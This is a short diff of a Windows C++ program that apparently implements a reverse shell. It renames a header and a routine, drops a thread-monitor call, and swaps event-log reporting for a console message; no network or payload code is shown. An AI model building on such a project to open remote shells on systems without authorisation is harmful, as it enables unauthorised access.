@@ -1,7 +1,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 
-#include "reverseShell.h"
+#include "reverse-shell.h"
 
 #include <iostream>
 
@@ -95,9 +95,6 @@ static BYTE initProcess(void) {
 	
 	initStopHandler();
 
-	if (launchThreadsMonitor() == FAILURE)
-		return (FAILURE);
-
 	if (initNetworking() == FAILURE)
 		return (FAILURE);
 
@@ -111,9 +108,10 @@ static BYTE initProcess(void) {
 }
 
 int main() {
-	journalHandle = RegisterEventSourceA(NULL, "safe-shell");
+	//journalHandle = RegisterEventSourceA(NULL, "safe-shell");
 
-	journalReport(L"Entering main loop\n");
+	//journalReport(L"Entering main loop\n");
+	std::cerr	<< "Entering main loop\n";
 	while (true) {
 
 		if (initProcess() == FAILURE)
@@ -121,7 +119,7 @@ int main() {
 
 		journalReport(L"Init process done");
 
-		if (startRoutines() == FAILURE)
+		if (startRoutine() == FAILURE)
 			break ;
 
 		if (g_stopProcess == TRUE)
